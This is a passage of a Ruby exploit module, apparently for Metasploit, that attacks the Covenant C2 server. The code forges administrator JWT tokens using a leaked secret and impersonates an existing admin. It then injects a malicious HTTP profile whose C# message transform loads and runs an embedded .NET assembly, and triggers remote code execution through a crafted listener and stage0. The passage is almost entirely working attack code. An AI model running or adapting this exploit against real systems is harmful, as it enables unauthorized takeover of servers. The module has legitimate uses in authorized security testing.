AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'
    payload =
"""public static class MessageTransform {
  public static string Transform(byte[] bytes) {
    try {
      string assemblyBase64 = \"#{dll}\";
      var assemblyBytes = System.Convert.FromBase64String(assemblyBase64);
      var assembly = System.Reflection.Assembly.Load(assemblyBytes);
      foreach (var type in assembly.GetTypes()) {
        object instance = System.Activator.CreateInstance(type);
        object[] args = new object[] { new string[] { \"\" } };
        try {
          type.GetMethod(\"Main\").Invoke(instance, args);
        }
        catch {}
      }
    }
    catch {}
    return System.Convert.ToBase64String(bytes);
  }

  public static byte[] Invert(string str) {
    return System.Convert.FromBase64String(str);
  }
}"""
  end

  def is_admin(user)
    roles = JSON.parse(read_user_role(user['id']))

    ret = false
    roles.each do |role|
      ret = true if role['roleId'] == @roleid_admin
    end

    ret
  end

  def list_users
    request_api('GET', normalize_uri('api', 'users')).body
  end

  def read_grunt_cfg
    data = {
      'id': 0,
      'listenerId': read_listener_id,
      'implantTemplateId': 1,
      'name': 'Binary',
      'description': 'Uses a generated .NET Framework binary to launch a Grunt.',
      'type': 'binary',
      'dotNetVersion': 'Net35',
      'runtimeIdentifier': 'win_x64',
      'validateCert': true,
      'useCertPinning': true,
      'smbPipeName': 'string',
      'delay': 0,
      'jitterPercent': 0,
      'connectAttempts': 0,
      'launcherString': 'GruntHTTP.exe',
      'outputKind': 'consoleApplication',
      'compressStager': false
    }

    # gerenate grunt payload
    response = request_api('PUT', normalize_uri('api', 'launchers', 'binary'),  data.to_json)
    if !response.nil?
      response = request_api('POST', normalize_uri('api', 'launchers', 'binary'),  data.to_json)
    end

    if !response.nil?
      return parse_grunt_cfg(response.body)
    end

    nil
  end

  def read_listeners
    response = request_api('GET', normalize_uri('api', 'listeners'))
    return response.body unless response.nil?
    nil
  end

  def read_listener_id
    listeners = read_listeners
    unless listeners.nil?
      listeners = JSON.parse(listeners)
      listeners.each do |listener|
        return listener['id'].to_i if listener['name'] == @listener_name
      end
    end

    return(-1)
  end

  def read_listener_type(name)
    response = request_api('GET', normalize_uri('api', 'listeners', 'types'))
    unless response.nil?
      listeners_types = JSON.parse(response.body)
      listeners_types.each do |listener_type|
        if listener_type['name'].downcase == name.downcase
          return listener_type['id'].to_i
        end
      end
    end
    return(-1)
  end

  def read_roleid_admin
    roles = request_api('GET', normalize_uri('api', 'roles')).body
    role_id = ''

    roles = JSON.parse(roles)
    roles.each do |role|
      if role['name'].downcase == 'administrator'
        role_id = role['id']
      end
    end

    role_id
  end

  def read_user_role(id)
    request_api('GET', normalize_uri('api', 'users', id, 'roles')).body
  end

  def request_api(method, uri, data = nil)
    headers = {}
    headers['Authorization'] = "Bearer #{@token}"

    request = {
      'method' => method,
      'uri' => uri,
      'headers' => headers
    }

    if method =~ /POST|PUT/
      request = request.merge({'ctype' => 'application/json', 'data' => data}) unless data.nil?
    end

    response = send_request_cgi(request)
    if response && response.code.to_s =~ /200|201/
      return response
    end

    nil
  end

  def message(msg)
    "#{datastore['RHOST']}:#{datastore['RPORT']} - #{msg}"
  end

  def parse_grunt_cfg(cfg)
    cfg = JSON.parse(cfg)

    # TODO: better way (https://rubular.com/)
    aes_key = cfg['stagerCode'].match(/.*byte\[\]\sSetupKeyBytes\s=\sConvert.FromBase64String\(@\"(.*?)\"\);.*$/).to_s.split("\"")[1]
    guid_prefix = cfg['stagerCode'].match(/.*string\saGUID\s=\s@\"(.*?)\";.*$/).to_s.split("\"")[1]

    return([aes_key, guid_prefix])
  end

  def random_id
    "#{SecureRandom.hex(4)}-#{SecureRandom.hex(2)}-#{SecureRandom.hex(2)}-#{SecureRandom.hex(2)}-#{SecureRandom.hex(6)}"
  end

  def upload_profile
    data = {
      'httpUrls': [
        '/en-us/index.html',
        '/en-us/docs.html',
        '/en-us/test.html'
      ],
      'httpRequestHeaders': [
        {'name': 'User-Agent', 'value': 'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36'},
        {'name': 'Cookies', 'value': 'ASPSESSIONID={GUID}; SESSIONID=1552332971750'}
      ],
      'httpResponseHeaders': [
        {'name': 'Server', 'value': 'Microsoft-IIS/7.5'}
      ],
      'httpPostRequest': 'i=a19ea23062db990386a3a478cb89d52e&data={DATA}&session=75db-99b1-25fe4e9afbe58696-320bea73',
      'httpGetResponse': '{DATA}',
      'httpPostResponse': '{DATA}',
      'id': 0,
      'name': "#{SecureRandom.hex(5)}",
      'description': '',
      'type': 'HTTP',
      'messageTransform': "#{generate_transform_payload}"
    }

    response = request_api('POST', normalize_uri('api', 'profiles', 'http'), data.to_json)
    return response['location'].split('/')[-1] unless response.nil?

    nil
  end

  def check
    @ip_address = datastore['RHOST']

    print_status(message('Trying to connect.'))

    # generate jwt token w/ ramdomized username.
    @token = generate_jwt

    unless list_users.nil?
      report_vuln(
        host: @ip_address,
        name: name,
        refs: references,
      )

      return Exploit::CheckCode::Vulnerable
    end

    return Exploit::CheckCode::Safe
  end

  def exploit
    unless check == CheckCode::Vulnerable || datastore['ForceExploit']
      fail_with(Failure::NotVulnerable, 'Set ForceExploit to override')
    end

    # check for active listener conflict.
    if check_tcp_port(datastore['RHOSTS'], datastore['C2_RPORT'])
      fail_with(Failure::Unknown, "The remote Covenant C2 have already tcp/#{datastore['C2_RPORT']} opened.")
    end

    print_status(message('Generating admin token w/ leaked JWT secret.'))

    # generate jwt token w/ ramdomized username.
    @token = generate_jwt

    print_status(message('Impersonating an admin user... finding token fields:'))

    # get role id with administrative right.
    @roleid_admin = read_roleid_admin
    print_good(message(" * found admin UID: #{@roleid_admin}."))

    users = JSON.parse(list_users)
    users.each do |user|
      next if user['userName'].downcase == 'serviceuser'

      if is_admin(user)
        print_good(message(" * found admin user: #{user['userName']}"))
        print_status(message('Generating new admin token w/ leaked JWT secret.'))

        # generate jwt token w/ spoofed username and user id.
        @token = generate_jwt(user['userName'], user['id'])

        break
      end
    end

    # generate and upload malicious profile.
    print_status(message('Genarate and inject malicious profile.'))
    profile_id = upload_profile
    
    fail_with(Failure::Unknown, 'Could not upload the malicious profile.') if profile_id.nil?

    # create a listener w/ embeded malicious profile.
    @listener_name = SecureRandom.hex(4)
    if create_listener(profile_id.to_i) == false
      fail_with(Failure::Unknown, 'Could not create the malicious listener.')
    end

    print_status(message('Get GRUNT configuration:'))

    # get grunt configuration (guid prefix and aes key).
    aes_key, guid_prefix = read_grunt_cfg

    print_good(message(" * AES key: #{aes_key}"))
    print_good(message(" * GUID prefix: #{guid_prefix}"))

    print_status(message('Sending stage0 to trigger exploitation.'))

    # trigger the exploitation.
    generate_stage0(aes_key, "#{guid_prefix}#{SecureRandom.hex(5)}")
  end

end
